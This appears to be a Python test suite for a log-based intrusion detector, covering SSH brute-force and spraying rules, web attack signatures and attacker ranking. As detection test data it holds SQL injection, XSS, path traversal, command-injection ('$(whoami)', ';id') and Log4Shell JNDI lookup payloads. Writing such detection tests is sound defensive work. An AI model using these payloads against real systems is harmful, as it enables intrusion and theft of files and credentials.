from datetime import datetime, timedelta

import pytest

from sentinela.detectors import Config, analyze, max_in_window, rank_attackers
from sentinela.models import Event, Severity

T0 = datetime(2026, 11, 24, 3, 0, 0)


def ssh(action, ip, user="root", sec=0, invalid=False):
    return Event(T0 + timedelta(seconds=sec), "ssh", ip, action, user=user, invalid_user=invalid,
                 raw=f"{action} {user} {ip}")


def web(path, ip="192.0.2.9", status=200, ua="Mozilla/5.0", method="GET", sec=0):
    return Event(T0 + timedelta(seconds=sec), "web", ip, "request", method=method, path=path,
                 status=status, user_agent=ua, raw=f"{method} {path} {status}")


def rules(alerts):
    return {a.rule_id for a in alerts}


def by_rule(alerts, rule_id):
    return next(a for a in alerts if a.rule_id == rule_id)


# ---- utilidade --------------------------------------------------------------

def test_max_in_window():
    evs = [ssh("failed", "x", sec=s) for s in (0, 10, 20, 400, 410)]
    assert max_in_window(evs, 30) == 3
    assert max_in_window(evs, 1000) == 5
    assert max_in_window([], 30) == 0


# ---- SSH --------------------------------------------------------------------

def test_brute_force_at_threshold():
    evs = [ssh("failed", "203.0.113.1", sec=i * 5) for i in range(10)]
    a = by_rule(analyze(evs), "SSH-001")
    assert a.severity == Severity.ALTA and a.count == 10 and "T1110.001" in a.mitre


def test_brute_force_below_threshold_is_silent():
    evs = [ssh("failed", "203.0.113.1", sec=i * 5) for i in range(9)]
    assert "SSH-001" not in rules(analyze(evs))


def test_brute_force_respects_window():
    # 20 falhas, mas uma por minuto: no máximo 6 numa janela de 5 min
    evs = [ssh("failed", "203.0.113.1", sec=i * 60) for i in range(20)]
    assert "SSH-001" not in rules(analyze(evs))


def test_password_spraying():
    evs = [ssh("failed", "198.51.100.1", user=f"u{i}", sec=i * 60, invalid=True) for i in range(6)]
    a = by_rule(analyze(evs), "SSH-002")
    assert "6 usuários" in a.description and "T1110.003" in a.mitre


def test_success_after_failures_is_critical():
    evs = [ssh("failed", "192.0.2.7", user="deploy", sec=i) for i in range(5)]
    evs.append(ssh("accepted", "192.0.2.7", user="deploy", sec=10))
    a = by_rule(analyze(evs), "SSH-003")
    assert a.severity == Severity.CRITICA
    assert a.events[-1].action == "accepted"


def test_typo_then_success_is_not_compromise():
    evs = [ssh("failed", "10.0.0.2", user="maria", sec=0),
           ssh("accepted", "10.0.0.2", user="maria", sec=5)]
    assert analyze(evs) == []


def test_old_failures_outside_lookback_are_ignored():
    evs = [ssh("failed", "10.0.0.2", user="maria", sec=i) for i in range(3)]
    evs.append(ssh("accepted", "10.0.0.2", user="maria", sec=7200))
    assert "SSH-003" not in rules(analyze(evs, Config(compromise_lookback=3600)))


def test_root_login():
    a = by_rule(analyze([ssh("accepted", "10.0.0.5", user="root")]), "SSH-004")
    assert a.severity == Severity.MEDIA


# ---- web: assinaturas -------------------------------------------------------

@pytest.mark.parametrize("path,rule", [
    ("/p?id=1%20UNION%20ALL%20SELECT%20NULL,NULL--", "WEB-001"),
    ("/p?id=1'%20OR%20'1'='1", "WEB-001"),
    ("/p?id=1%20AND%20SLEEP(5)", "WEB-001"),
    ("/p?id=1%2527%2520OR%25201%253D1", "WEB-001"),          # double encoding
    ("/busca?q=%3Cscript%3Ealert(1)%3C/script%3E", "WEB-002"),
    ("/busca?q=<img src=x onerror=alert(1)>", "WEB-002"),
    ("/download?file=../../../../etc/passwd", "WEB-003"),
    ("/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", "WEB-003"),
    ("/x?f=php://filter/resource=index.php", "WEB-003"),
    ("/api/ping?host=127.0.0.1;id", "WEB-004"),
    ("/api/ping?host=$(whoami)", "WEB-004"),
    ("/.env", "WEB-006"),
    ("/.git/HEAD", "WEB-006"),
    ("/backup.sql", "WEB-006"),
])
def test_signatures(path, rule):
    assert rule in rules(analyze([web(path, status=403)]))


def test_log4shell_in_user_agent():
    evs = [web("/", ua="${${lower:j}ndi:ldap://192.0.2.200/a}")]
    assert by_rule(analyze(evs), "WEB-005").severity == Severity.CRITICA


def test_scanner_user_agent():
    a = by_rule(analyze([web("/", ua="sqlmap/1.8#stable")]), "WEB-007")
    assert a.severity == Severity.BAIXA and "sqlmap" in a.description


@pytest.mark.parametrize("path", [
    "/", "/produtos/12", "/busca?q=notebook+gamer", "/static/js/app.js",
    "/blog/como-usar-o-select-do-sql", "/api/produtos?pagina=2&ordem=preco",
    "/contato?assunto=or%C3%A7amento", "/sobre#equipe",
])
def test_normal_traffic_has_no_alerts(path):
    assert analyze([web(path)]) == []


def test_2xx_escalates_severity():
    blocked = by_rule(analyze([web("/f?x=../../etc/passwd", status=403)]), "WEB-003")
    worked = by_rule(analyze([web("/f?x=../../etc/passwd", status=200)]), "WEB-003")
    assert blocked.severity == Severity.ALTA
    assert worked.severity == Severity.CRITICA and worked.notes


def test_scanner_rule_never_escalates():
    a = by_rule(analyze([web("/", ua="nikto", status=200)]), "WEB-007")
    assert a.severity == Severity.BAIXA


def test_alerts_grouped_per_ip():
    evs = [web("/.env", ip="192.0.2.1", sec=i) for i in range(3)] + [web("/.env", ip="192.0.2.2")]
    hits = [a for a in analyze(evs) if a.rule_id == "WEB-006"]
    assert sorted((a.ip, a.count) for a in hits) == [("192.0.2.1", 3), ("192.0.2.2", 1)]


# ---- web: comportamento -----------------------------------------------------

def test_directory_scan():
    evs = [web(f"/dir{i}", status=404, sec=i) for i in range(25)]
    assert "WEB-010" in rules(analyze(evs))


def test_few_404_is_fine():
    evs = [web(f"/dir{i}", status=404, sec=i * 30) for i in range(25)]
    assert "WEB-010" not in rules(analyze(evs))


def test_login_brute_force():
    evs = [web("/wp-login.php", method="POST", status=401, sec=i * 2) for i in range(12)]
    assert by_rule(analyze(evs), "WEB-011").severity == Severity.ALTA


# ---- ranking ----------------------------------------------------------------

def test_attacker_ranking_correlates_sources():
    ip = "203.0.113.45"
    evs = [ssh("failed", ip, sec=i) for i in range(10)]
    evs += [web("/login", ip=ip, method="POST", status=401, sec=i) for i in range(10)]
    evs += [web("/.env", ip="192.0.2.1")]
    top = rank_attackers(analyze(sorted(evs, key=lambda e: e.timestamp)))
    assert top[0].ip == ip
    assert top[0].sources == ["ssh", "web"]
    assert top[0].rules == ["SSH-001", "WEB-011"]


def test_alerts_sorted_by_severity():
    evs = [web("/", ua="nikto"), web("/?a=${jndi:ldap://x}", ip="192.0.2.3")]
    sevs = [a.severity for a in analyze(evs)]
    assert sevs == sorted(sevs, reverse=True)
